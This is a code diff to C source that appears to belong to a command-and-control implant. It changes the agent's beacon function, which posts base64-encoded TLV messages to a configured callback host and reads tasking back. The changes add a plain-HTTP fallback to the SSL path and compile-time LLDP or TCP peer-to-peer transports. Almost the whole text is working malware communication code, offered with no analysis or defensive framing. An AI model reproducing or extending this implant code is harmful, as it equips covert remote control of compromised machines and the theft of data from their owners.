@@ -25,15 +25,18 @@ uint8_t *https_post(const char *host, int port, const char *uri,
                      uint32_t *resp_len) {
     *resp_len = 0;
 
-    DBG("https_post: resolving %s:%d", host, port);
+    if (!host || host[0] == '\0') {
+        DBG("https_post: empty callback host");
+        return NULL;
+    }
 
-    /* use inet_pton first to avoid getaddrinfo NSS crash in static binaries */
+    DBG("https_post: resolving %s:%d (ssl=%d)", host, port, g_state.use_ssl);
+
     struct sockaddr_in addr = {0};
     addr.sin_family = AF_INET;
     addr.sin_port = htons((uint16_t)port);
 
     if (inet_pton(AF_INET, host, &addr.sin_addr) != 1) {
-        /* not a raw IP - fall back to getaddrinfo */
         struct addrinfo hints = {0}, *res = NULL;
         hints.ai_family = AF_INET;
         hints.ai_socktype = SOCK_STREAM;
@@ -65,17 +68,6 @@ uint8_t *https_post(const char *host, int port, const char *uri,
         return NULL;
     }
 
-    DBG("https_post: SSL handshake");
-    SSL *ssl = SSL_new(g_state.ssl_ctx);
-    if (!ssl) { DBG("https_post: SSL_new failed"); close(sock); return NULL; }
-    SSL_set_fd(ssl, sock);
-    if (SSL_connect(ssl) <= 0) {
-        DBG("https_post: SSL_connect failed");
-        SSL_free(ssl);
-        close(sock);
-        return NULL;
-    }
-
     char header[1024];
     int hlen = snprintf(header, sizeof(header),
         "POST /%s HTTP/1.1\r\n"
@@ -86,23 +78,53 @@ uint8_t *https_post(const char *host, int port, const char *uri,
         "\r\n",
         uri, host, port, body_len);
 
-    SSL_write(ssl, header, hlen);
-    SSL_write(ssl, body, (int)body_len);
+    SSL *ssl = NULL;
+    if (g_state.use_ssl) {
+        DBG("https_post: SSL handshake");
+        ssl = SSL_new(g_state.ssl_ctx);
+        if (!ssl) { DBG("https_post: SSL_new failed"); close(sock); return NULL; }
+        SSL_set_fd(ssl, sock);
+        if (SSL_connect(ssl) <= 0) {
+            DBG("https_post: SSL_connect failed");
+            SSL_free(ssl);
+            close(sock);
+            return NULL;
+        }
+        SSL_write(ssl, header, hlen);
+        SSL_write(ssl, body, (int)body_len);
+    } else {
+        DBG("https_post: plain HTTP");
+        if (send(sock, header, hlen, 0) < 0 ||
+            send(sock, body, body_len, 0) < 0) {
+            DBG("https_post: send failed");
+            close(sock);
+            return NULL;
+        }
+    }
 
     uint32_t buf_cap = 65536;
     uint8_t *buf = (uint8_t *)malloc(buf_cap);
     uint32_t buf_len = 0;
     int n;
-    while ((n = SSL_read(ssl, buf + buf_len, (int)(buf_cap - buf_len))) > 0) {
-        buf_len += (uint32_t)n;
-        if (buf_len + 4096 > buf_cap) {
-            buf_cap *= 2;
-            buf = (uint8_t *)realloc(buf, buf_cap);
+    if (ssl) {
+        while ((n = SSL_read(ssl, buf + buf_len, (int)(buf_cap - buf_len))) > 0) {
+            buf_len += (uint32_t)n;
+            if (buf_len + 4096 > buf_cap) {
+                buf_cap *= 2;
+                buf = (uint8_t *)realloc(buf, buf_cap);
+            }
+        }
+        SSL_shutdown(ssl);
+        SSL_free(ssl);
+    } else {
+        while ((n = recv(sock, buf + buf_len, buf_cap - buf_len, 0)) > 0) {
+            buf_len += (uint32_t)n;
+            if (buf_len + 4096 > buf_cap) {
+                buf_cap *= 2;
+                buf = (uint8_t *)realloc(buf, buf_cap);
+            }
         }
     }
-
-    SSL_shutdown(ssl);
-    SSL_free(ssl);
     close(sock);
 
     uint8_t *body_start = NULL;
@@ -140,10 +162,18 @@ uint8_t *agent_send(const uint8_t *tlv, uint32_t tlv_len, uint32_t *out_len) {
     char *b64 = b64_encode(raw, raw_len, &b64_len);
     free(raw);
 
-    uint32_t resp_b64_len;
-    uint8_t *resp_b64 = https_post(g_state.callback_host, g_state.callback_port,
-                                    g_state.post_uri, (uint8_t *)b64, (uint32_t)b64_len,
-                                    &resp_b64_len);
+    uint32_t resp_b64_len = 0;
+    uint8_t *resp_b64 = NULL;
+
+#if defined(LLDP_TRANSPORT)
+    resp_b64 = lldp_p2p_send((uint8_t *)b64, (uint32_t)b64_len, &resp_b64_len);
+#elif defined(TCP_TRANSPORT)
+    resp_b64 = tcp_p2p_send((uint8_t *)b64, (uint32_t)b64_len, &resp_b64_len);
+#else
+    resp_b64 = https_post(g_state.callback_host, g_state.callback_port,
+                          g_state.post_uri, (uint8_t *)b64, (uint32_t)b64_len,
+                          &resp_b64_len);
+#endif
     free(b64);
     if (!resp_b64 || resp_b64_len == 0) {
         free(resp_b64);
